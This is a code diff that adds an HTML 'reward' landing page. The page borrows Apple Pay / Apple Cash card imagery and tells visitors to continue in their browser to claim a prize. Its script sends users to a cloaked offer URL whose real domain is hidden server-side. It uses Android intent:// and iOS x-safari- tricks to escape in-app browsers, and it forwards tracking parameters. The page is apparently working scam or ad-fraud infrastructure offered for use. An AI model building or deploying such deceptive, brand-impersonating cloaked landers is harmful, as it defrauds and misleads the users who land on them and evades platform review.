@@ -1,0 +1,97 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1.0,viewport-fit=cover,maximum-scale=1.0">
+<meta name="theme-color" content="#f1f1f4">
+<meta name="apple-mobile-web-app-capable" content="yes">
+<meta name="robots" content="noindex,nofollow">
+<title>Continue</title>
+<link rel="preload" as="image" href="/images/Applepay750.png">
+<style>
+  * { margin:0; padding:0; box-sizing:border-box; -webkit-tap-highlight-color:transparent; }
+  html { -webkit-text-size-adjust:100%; }
+  body {
+    font-family:-apple-system,BlinkMacSystemFont,"SF Pro Display","SF Pro Text","Segoe UI",Roboto,Helvetica,Arial,sans-serif;
+    background:#f1f1f4; color:#1d1d1f;
+    min-height:100vh; min-height:100dvh;
+    display:flex; align-items:center; justify-content:center;
+    -webkit-font-smoothing:antialiased; text-rendering:optimizeLegibility;
+  }
+  .wrap {
+    width:100%; max-width:430px;
+    padding:max(40px,env(safe-area-inset-top)) 26px calc(40px + env(safe-area-inset-bottom));
+    text-align:center;
+  }
+  .card {
+    width:100%; border-radius:22px; overflow:hidden;
+    background:#0a0a0a; box-shadow:0 16px 36px rgba(0,0,0,0.22); line-height:0;
+    margin-bottom:30px;
+  }
+  .card img { width:100%; height:auto; display:block; }
+  h1 {
+    font-size:clamp(26px,7.6vw,32px); font-weight:600; letter-spacing:-1px; line-height:1.1;
+    margin-bottom:12px;
+  }
+  p.sub {
+    font-size:clamp(14px,4.4vw,16px); font-weight:400; color:#6e6e73; line-height:1.5;
+    max-width:340px; margin:0 auto 30px;
+  }
+  /* Small Apple-style Continue button */
+  .btn {
+    display:inline-flex; align-items:center; gap:9px;
+    background:#0a0a0a; color:#fff; text-decoration:none;
+    font-size:17px; font-weight:600; letter-spacing:-0.2px;
+    padding:15px 34px; border-radius:14px; border:0; cursor:pointer;
+    transition:transform .12s ease, opacity .12s ease;
+  }
+  .btn:active { transform:scale(.97); opacity:.9; }
+  .hint { margin-top:18px; font-size:12px; color:#a1a1a6; }
+</style>
+</head>
+<body>
+  <div class="wrap">
+    <div class="card">
+      <!-- Reuses the Apple Cash card so this matches the ApplePay lander. Swap if needed. -->
+      <img src="/images/Applepay750.png" alt="Reward">
+    </div>
+    <h1>You're almost there</h1>
+    <p class="sub">For security, please continue in your browser to finish claiming your reward.</p>
+    <a href="#" id="continue" class="btn">Continue <span>&rarr;</span></a>
+    <div class="hint">Opens in Safari / your default browser</div>
+  </div>
+
+<script>
+  // Cloaked destination on THIS domain (trendhavenn stays server-side in /api/copper).
+  // Forward all incoming params (campid, utm_*, etc.) straight through.
+  var QS = window.location.search || '';
+  var ABS_OFFER = window.location.origin + '/api/copper' + QS;
+
+  // No-JS fallback: the button is a real link to the cloaked offer.
+  var btn = document.getElementById('continue');
+  btn.setAttribute('href', ABS_OFFER);
+
+  function breakout(e) {
+    if (e) e.preventDefault();
+    var ua = navigator.userAgent || navigator.vendor || '';
+    var isAndroid = /android/i.test(ua);
+    var isIOS = /iphone|ipad|ipod/i.test(ua) && !window.MSStream;
+
+    if (isAndroid) {
+      // Android: intent:// reliably hands off to the external browser.
+      var noScheme = ABS_OFFER.replace(/^https?:\/\//, '');
+      window.location.href = 'intent://' + noScheme + '#Intent;scheme=https;action=android.intent.action.VIEW;end';
+      setTimeout(function () { window.location.href = ABS_OFFER; }, 1200);
+    } else if (isIOS) {
+      // iOS: best-effort Safari hand-off, then fall back so the user still lands on the offer.
+      window.location.href = 'x-safari-' + ABS_OFFER;
+      setTimeout(function () { window.location.href = ABS_OFFER; }, 1200);
+    } else {
+      // Desktop / already a real browser: just go.
+      window.location.href = ABS_OFFER;
+    }
+  }
+  btn.addEventListener('click', breakout);
+</script>
+</body>
+</html>
